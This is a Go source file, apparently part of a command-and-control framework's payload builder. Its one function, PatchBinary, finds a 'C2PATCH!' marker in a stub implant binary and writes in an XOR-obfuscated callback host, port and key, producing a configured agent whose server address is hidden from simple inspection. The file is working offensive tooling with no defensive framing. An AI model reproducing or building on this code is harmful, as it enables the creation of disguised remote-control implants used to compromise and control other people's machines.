package payload

import (
	"bytes"
	"fmt"
)

var patchMagic = []byte("C2PATCH!")

const (
	patchKeyOff  = 8
	patchHostOff = 9
	patchHostLen = 63
	patchPortOff = 72
	patchPortLen = 8
	patchBlobLen = 80
)

func PatchBinary(bin []byte, host, port string, key byte) ([]byte, error) {
	if len(host) > patchHostLen-1 || len(port) > patchPortLen-1 {
		return nil, fmt.Errorf("%w: host/port too long", ErrInvalid)
	}
	i := bytes.Index(bin, patchMagic)
	if i < 0 || i+patchBlobLen > len(bin) {
		return nil, fmt.Errorf("payload stub missing patch site")
	}
	out := append([]byte(nil), bin...)
	out[i+patchKeyOff] = key
	for n := 0; n < patchHostLen; n++ {
		out[i+patchHostOff+n] = 0
	}
	for n := 0; n < patchPortLen; n++ {
		out[i+patchPortOff+n] = 0
	}
	copy(out[i+patchHostOff:], xorEncode(host, key))
	copy(out[i+patchPortOff:], xorEncode(port, key))
	return out, nil
}
